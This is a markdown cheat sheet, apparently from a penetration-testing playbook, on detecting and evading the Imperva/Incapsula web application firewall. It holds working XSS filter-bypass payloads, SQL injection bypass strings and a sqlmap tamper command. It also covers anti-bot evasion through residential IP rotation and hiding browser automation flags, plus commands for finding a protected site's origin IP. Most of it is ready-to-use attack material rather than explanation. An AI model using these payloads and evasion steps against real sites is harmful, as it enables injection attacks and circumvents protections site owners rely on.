# Imperva / Incapsula

### Detection Signals
| Signal | Where |
|--------|-------|
| `incap_ses_*` cookies | Multiple session cookies with numeric suffixes |
| `visid_incap_*` cookie | Visitor ID cookie |
| `X-CDN: Imperva` header | Response header (sometimes) |
| `X-Iinfo` header | Response header with request metadata |
| `_Incapsula_Resource` in URL | JavaScript challenge redirect |
| 302 to `/_Incapsula_Resource?SWJIYLWA=...` | Initial challenge redirect |

### Bypass Strategy
- **Recommended tool**: Playwright (headless: false) to solve JS challenge, then reuse cookies
- **IP rotation**: Imperva is aggressive with IP reputation. Rotate residential IPs if blocked.
- **Browser fingerprint**: Imperva checks `navigator.webdriver` — use `--disable-blink-features=AutomationControlled` in Chromium
- **Cookie chain**: Must complete full challenge flow: initial request -> JS challenge -> cookie set -> re-request

### XSS Bypass
```
# Imperva blocks: <script>, onerror, alert, prompt, confirm
# Bypasses:

# Using constructor:
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror=self[atob('YWxlcnQ=')](1)>

# Obfuscated event handlers:
<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>

# DOM clobbering context (if reflected in JS):
'-alert(1)-'
";alert(1)//
```

### SQLi Bypass
```
sqlmap --tamper=space2comment,between,equaltolike,randomcase -u URL

# Imperva blocks: UNION SELECT, OR/AND with comparisons
# Bypasses:
' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3--
' %55NION %53ELECT 1,2,3--
' union%0a%0aselect%0a1,2,3--
```

### Rate Limiting
- Aggressive bot detection. Blocks after ~5-15 rapid requests from automated tools.
- Per-IP and per-session.
- JavaScript challenge issued before block (302 redirect).
- Recovery: New IP + new browser session.

### Origin IP Discovery
```bash
# Same approaches as Cloudflare, plus:
# Imperva-specific: check for direct IP in SSL cert
tlsx -u TARGET:443 -san -cn -so
# Check for origin in response headers (some misconfigs leak it)
curl -sI https://TARGET | grep -i "x-origin\|x-real-ip\|x-backend"
# DNS history for pre-Imperva records
```

---

